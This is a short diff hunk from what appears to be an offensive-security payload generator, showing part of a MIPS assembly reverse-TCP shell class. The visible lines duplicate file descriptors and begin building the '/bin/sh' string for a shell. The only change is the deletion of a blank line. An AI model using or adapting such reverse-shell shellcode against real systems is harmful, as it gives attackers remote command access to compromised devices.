@@ -83,7 +83,6 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
             li $s0, -1
             addi $s1, $s1, -1
             bne $s1, $s0, dup
-
             slti $a2, $zero, -1
             lui $t7, 0x2f2f
             ori $t7, $t7, 0x6269
